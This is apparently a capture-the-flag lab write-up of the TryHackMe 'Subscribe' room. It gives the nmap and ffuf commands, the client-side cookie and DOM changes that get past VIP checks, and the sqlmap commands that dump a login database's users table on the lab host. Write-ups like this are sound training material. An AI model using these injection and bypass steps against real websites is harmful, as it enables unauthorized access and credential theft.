# TryHack3M: Subscribe

**Difficulty:** Medium

## Reconnaissance

Running a standard nmap scan revealed several open ports:
```bash
nmap -sC -sV -oN nmap.txt hackme.thm -T4
```

**Results:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b9:7f:e0:60:98:00:89:65:fa:0f:c0:1b:8e:80:41:55 (RSA)
|   256 a0:fd:cb:0b:da:09:12:76:7c:4d:82:62:f7:b4:18:cc (ECDSA)
|_  256 1f:d4:f5:3a:90:77:92:98:68:c2:b4:13:fd:2a:31:50 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Hack3M | Cyber Security Training
8000/tcp open  http    Splunkd httpd
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://hackme.thm:8000/en-US/account/login?return_to=%2Fen-US%2F
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Splunkd
8089/tcp open  ssl/http Splunkd httpd (free license; remote login disabled)
|_http-server-header: Splunkd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2024-04-05T11:00:59
|_Not valid after:  2027-04-05T11:00:59
|_http-title: Site doesn't have a title (text/xml; charset=UTF-8).
```

The nmap scan revealed an Apache web server on port 80, along with Splunk services on ports 8000 and 8089 for later tasks.

Directory fuzzing with ffuf uncovered several endpoints:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://hackme.thm/FUZZ -e .html,.php,.txt
```

**Notable findings:**
```
connection.php          [Status: 200]
config.php              [Status: 200]
dashboard.php           [Status: 302]
login.php               [Status: 200]
sign_up.php             [Status: 200]
subscribe.php           [Status: 302]
```

## Finding the Invite Code

### Discovering the Hidden Endpoint

While inspecting the sign-up page using Firefox Developer Tools (F12 → Network tab), I noticed a JavaScript file `script.js` being loaded. Examining its contents revealed an interesting function:
```javascript
function e() {
    var e = window.location.hostname;
    if (e === "capture3millionsubscribers.thm") {
        var o = new XMLHttpRequest;
        o.open("POST", "inviteCode1337HM.php", true);
        o.onload = function() {
            if (this.status == 200) {
                console.log("Invite Code:", this.responseText)
            } else {
                console.error("Error fetching invite code.")
            }
        };
        o.send()
    } else if (e === "hackme.thm") {
        console.log("This function does not operate on hackme.thm")
    } else {
        console.log("Lol!! Are you smart enough to get the invite code?")
    }
}
```

The function only executes when accessing the site from the hostname `capture3millionsubscribers.thm`.

### Bypassing Hostname Verification

I added the required hostname to my `/etc/hosts` file:
```bash
echo "MACHINE_IP capture3millionsubscribers.thm" | sudo tee -a /etc/hosts
```

Then opened Firefox Developer Console (F12 → Console) and executed the function:
```javascript
e()
```

**Output:**
```
Invite Code: {REDACTED}
```

After submitting the invite code to `sign_up.php`, I received guest account credentials for `guest@hackme.thm`.

## Discovering the Secure Token

### VIP Access Bypass

Navigating to `advanced_red_teaming.php` revealed a page restricted to VIP users. Initially, I had to modify the `isVIP` cookie value from `false` to `true` using Firefox Developer Tools (F12 → Storage → Cookies). After updating the cookie, inspecting the page source showed additional JavaScript code performing a client-side VIP status check: 

```javascript
var isVIPE = document.getElementById("isVIP");
var isVIP = (isVIPE.value.toLowerCase() === 'true');

if(isVIP) {
    ...
} else {
    alert("This page is only for VIP users")
}
```

Using Firefox Developer Tools (F12 → Inspector), I searched for the hidden `isVIP` element and changed its value from `false` to `true`. This bypassed the VIP check and revealed a "Start Machine" button.

### Remote Code Execution

Clicking "Start Machine" provided access to a terminal interface with RCE capabilities. I used this to read the configuration file:
```bash
cat config.php
```

**Output:**
```php
<?php
$SECURE_TOKEN = "ACC#SS_TO_ADM1N_P@NEL";
$urlAdminPanel = "http://admin1337special.hackme.thm:40009";
?>
```

**Key findings:**
- Secure Token: `ACC#SS_TO_ADM1N_P@NEL`
- Admin Panel URL: `http://admin1337special.hackme.thm:40009`

## Accessing the Admin Panel

### Initial Enumeration

I added the new subdomain to my `/etc/hosts` file:
```bash
echo "MACHINE_IP admin1337special.hackme.thm" | sudo tee -a /etc/hosts
```

Attempting to access the root URL returned a 302 redirect to `/public/html/`, which resulted in a 403 Forbidden error. I proceeded with directory fuzzing:
```bash
ffuf -u http://admin1337special.hackme.thm:40009/public/html/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -H 'Cookie: SECURE_TOKEN=ACC#SS_TO_ADM1N_P@NEL' \
  -e .php,.html,.txt,.js,.css
```

**Discovered endpoints:**
- `login.php` - Authentication page requiring an auth code
- `dashboard.php` - Admin dashboard (authentication required)

### Analyzing Authentication Mechanisms

Examining the page source and `login.js` revealed two authentication methods:

**1. Form-based auth code login:**
```html
<form action="" method="post">
    <input type="text" name="authcode" class="form-control">
    <button type="submit">Submit</button>
</form>
```

**2. JSON API authentication:**
```javascript
fetch('../../api/login.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({
        username: username,
        password: password,
    }),
})
.then(response => response.json())
.then(data => {
    if (data.error) {
        alert(data.error);
    } else {
        window.location.href = data.role == 'admin' ? 'dashboard.php' : 'dashboard.php';
    }
})
```

## SQL Injection & Credential Extraction

### Identifying the Vulnerability

I created a request file for sqlmap to test the JSON API endpoint for SQL injection:
```bash
cat > request.txt << 'EOF'
POST /api/login.php HTTP/1.1
Host: admin1337special.hackme.thm:40009
Cookie: SECURE_TOKEN=ACC#SS_TO_ADM1N_P@NEL
Content-Type: application/json

{"username":"admin*","password":"test*"}
EOF
```

### Running sqlmap
```bash
sqlmap -r request.txt --batch --level 5 --risk 3
```

**sqlmap output:**
```
[INFO] (custom) POST parameter 'JSON #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable
[INFO] (custom) POST parameter 'JSON #1*' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
```

SQL injection confirmed! The API was vulnerable to both boolean-based blind and error-based SQL injection.

### Database Enumeration

**Listing databases:**
```bash
sqlmap -r request.txt --batch --dbs
```

**Output:**
```
[*] hackme
```

**Listing tables in the hackme database:**
```bash
sqlmap -r request.txt --batch -D hackme --tables
```

**Output:**
```
Database: hackme
[2 tables]
+--------+
| config |
| users  |
+--------+
```

**Dumping the users table:**
```bash
sqlmap -r request.txt --batch -D hackme -T users --dump
```

**Admin credentials obtained:**
- Username: `admin`
- Password: `REDACTED`

## Enabling Registration & Final Flag

### Logging into the Admin Dashboard

Using the extracted credentials to authenticate:
```bash
curl -X POST http://admin1337special.hackme.thm:40009/api/login.php \
  -H 'Cookie: SECURE_TOKEN=ACC#SS_TO_ADM1N_P@NEL' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"REDACTED"}' \
  -c cookies.txt
```

### Dashboard Analysis

The dashboard presented a form for managing registration settings:
```html
<form id="postForm" action="" method="POST">
    <div class="form-group">
        <label for="title">Choose an action:</label>
        <select id="actionSelect" class="form-control" name="regtype">
            <option value="reg" class="form-control" selected>Sign up</option>
            <option value="invite" class="form-control">Invite Code</option>
        </select>
    </div>
    <input type="submit" value="Set Options" class="btn btn-primary">
</form>
```

I submitted the form to enable the "Sign up" registration feature

### Obtaining the Final Flag

After enabling the registration feature, I navigated back to the main website at `http://hackme.thm` and refreshed the page. The platform now displayed the final flag:

**Flag:** `THM{REDACTED}`
